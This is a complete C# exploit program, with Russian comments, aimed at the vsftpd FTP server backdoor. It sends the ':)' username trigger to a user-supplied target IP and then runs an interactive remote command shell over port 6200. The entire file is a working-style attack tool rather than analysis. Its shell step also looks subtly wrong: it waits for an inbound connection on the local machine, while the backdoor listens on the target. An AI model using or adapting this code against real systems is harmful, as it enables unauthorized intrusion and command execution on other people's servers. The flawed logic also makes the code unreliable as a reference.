using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace VsftpdExploit
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Введите IP-адрес целевой машины: ");
            string targetIp = Console.ReadLine();
            int targetPort = 21;
            int listenPort = 6200;

            try
            {
                // Подключение к целевому FTP-серверу
                using (TcpClient client = new TcpClient(targetIp, targetPort))
                using (NetworkStream stream = client.GetStream())
                {
                    Console.WriteLine("Подключение к FTP-серверу...");
                    byte[] buffer = new byte[1024];
                    stream.Read(buffer, 0, buffer.Length);
                    Console.WriteLine("Получен баннер: " + Encoding.ASCII.GetString(buffer));

                    // Отправка имени пользователя с :)
                    SendCommand(stream, "USER user:)\r\n");
                    stream.Read(buffer, 0, buffer.Length);
                    Console.WriteLine("Ответ на USER: " + Encoding.ASCII.GetString(buffer));

                    // Отправка пароля
                    SendCommand(stream, "PASS pass\r\n");
                    stream.Read(buffer, 0, buffer.Length);
                    Console.WriteLine("Ответ на PASS: " + Encoding.ASCII.GetString(buffer));
                }

                // Прослушивание порта 6200 для обратного соединения
                Console.WriteLine("Ожидание обратного соединения на порту 6200...");
                using (TcpListener listener = new TcpListener(IPAddress.Any, listenPort))
                {
                    listener.Start();
                    using (TcpClient shellClient = listener.AcceptTcpClient())
                    using (NetworkStream shellStream = shellClient.GetStream())
                    {
                        Console.WriteLine("Обратное соединение установлено!");

                        // Получение командной оболочки и выполнение команд
                        while (true)
                        {
                            Console.Write("$ ");
                            string command = Console.ReadLine();
                            if (command.ToLower() == "exit")
                                break;

                            byte[] commandBytes = Encoding.ASCII.GetBytes(command + "\n");
                            shellStream.Write(commandBytes, 0, commandBytes.Length);

                            byte[] responseBuffer = new byte[1024];
                            int bytesRead = shellStream.Read(responseBuffer, 0, responseBuffer.Length);
                            Console.WriteLine(Encoding.ASCII.GetString(responseBuffer, 0, bytesRead));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Произошла ошибка: " + ex.Message);
            }
        }

        static void SendCommand(NetworkStream stream, string command)
        {
            byte[] commandBytes = Encoding.ASCII.GetBytes(command);
            stream.Write(commandBytes, 0, commandBytes.Length);
        }
    }
}
